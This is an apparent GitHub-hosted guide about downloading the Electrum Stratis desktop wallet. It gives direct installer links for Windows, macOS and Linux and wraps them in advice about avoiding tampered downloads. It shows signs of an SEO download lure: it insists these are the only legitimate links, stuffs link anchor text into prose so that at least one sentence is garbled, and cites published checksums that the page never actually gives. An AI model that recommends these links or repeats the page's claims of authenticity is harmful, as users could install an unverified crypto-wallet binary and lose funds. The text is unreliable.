![Electrum-Stratis](assets/banner-article.png)

# Where to download Electrum Stratis in 2026

<p align="center">One release page, one checksum, no mirrors</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The only place to download Electrum Stratis is its GitHub release page, where the build and its published checksum come from the same source. Links from search results, ads, mirrors, Telegram groups and "portable" reuploads are unverifiable and are the usual vector for a tampered wallet. The 2018 download links no longer serve a working build; the release page carries the current one. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you are doing | What to do instead |
|---|---|
| Following a link from a search result | Open the release page directly and download there |
| Looking for the 2018 installer you remember | Use the current release; old installers are not the current build |
| Found a mirror with a faster download | Do not; a mirror cannot be verified against the project |
| Following a link posted in a chat or a video | Treat it as untrusted and reach the release page yourself |
| Comparing file sizes with a guide | Compare the checksum with the published one instead |

</div>

Verification is the whole point of naming one source: a checksum you can compare proves the file is the file the project published, and nothing else can.

## Why it happens

Software distribution has an asymmetry that attackers exploit: the download and the proof of authenticity are separate objects. If both come from the same page, comparing them is meaningful. If the file comes from one place and the checksum from another, the comparison proves nothing, because whoever supplied the file could have supplied the checksum too.

Old installers compound the problem, and a file that cannot be verified is a [is Electrum Stratis safe](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) rather than a convenience one. A build from 2018 cannot have the fixes that came after it, and an installer circulating for eight years has had eight years to be replaced by something else with the same name. The current release is the one to run.

That is why the maintained build matters: it is the only one with a published checksum, and the current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

Asset names repeat across releases, which is why a file called electrum-stratis.exe proves nothing about its contents. The release page ties a file to a tag and to a published hash; a mirror, a re-upload or a link in a video carries the same name with no such tie. Comparing the hash is therefore not a formality but the only step that distinguishes the build the project published from a file that merely looks like it.

## Fix

1. **Open the release page from a bookmark you created yourself.** Not from a search result, not from a link in a message.
2. **Download the asset for your operating system.** Windows, macOS and Linux builds are listed separately; there is no mobile build to look for.
3. **Compare the checksum before running anything.** Compute the hash of the downloaded file and compare it with the published value. A mismatch means delete, not "try anyway".
4. **Confirm the build inside the wallet after launch.** The security posture view shows version, build date, commit hash and advisory status, so what is running can be matched to what was published.
5. **Keep the installer only if you need it.** The wallet updates from the release page; an old installer kept in a downloads folder is a file you may one day run by mistake.

If the release page lists no checksum for the file you downloaded, wait for one rather than running the file. That is a real constraint, not a formality.

## If that did not work

If your operating system refuses to run the file, confirm it is the right build for the right architecture - an ARM build will not run on an x86 machine, and the reverse is also true. Do not disable system security to work around a refusal; that converts a detection into a compromise.

If the file runs but asks for a seed or a password before showing a wallet, stop: the wallet asks for a seed only inside a restore flow, never as an opening demand. An application that asks for recovery material at launch is not this wallet.

If you installed from somewhere else and are unsure what you have, remove it, create a fresh wallet from a seed generated on a clean machine, and move the funds. Do not reuse a seed that was typed into an unverified application.

## Prevention

- Keep the release page bookmarked; use the bookmark every time.
- Check the checksum on first download and on every update.
- Never run an installer sent by another person.
- Ignore "official download" ads; the project does not buy placement.
- If a page asks for a seed to "activate" a download, close it.
- Bookmark the release page yourself; a link from a message, an ad or a video is not a source.

## FAQ

### Where can I download Electrum Stratis?

From its GitHub release page, and only from there. The page lists the Windows, macOS and Linux assets and publishes the checksum for each, so the file can be verified before it runs.

### I downloaded the Stratis Qt wallet in 2018 and cannot find the download now. What changed?

The old Qt wallet was a full-node application and is not what this project distributes. The current build is the Electrum-derived desktop wallet on the release page; if you still have legacy coins in a Qt wallet, they move by exporting keys, not by finding an old installer.

### Is a portable build available?

The release page lists the assets that exist, and that list is the answer for any given release. Prefer the published asset over any portable copy circulating elsewhere: a portable build from an unknown source has no checksum you can trust.

### Do I need to uninstall the previous version first?

Installing over an existing wallet keeps your wallet files, which live outside the application folder. Back up the wallet file and the seed before updating anyway, and confirm the version inside the wallet afterwards.

<!-- DOWNLOAD-BLOCK -->

The release page is the only source that ties a file to a tag and a published hash. Everything else, including a search result that looks official and a mirror that copies the assets, gives you a file without that tie. Save the page, save the hash, and compare before you run anything. The check takes a minute and is the last point where a wrong download is still harmless.

## Related articles

- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [Install on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/install-on-windows-walkthrough.md)
- [Ubuntu and the PyQt4 error](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/linux-pyqt4-error-fix.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
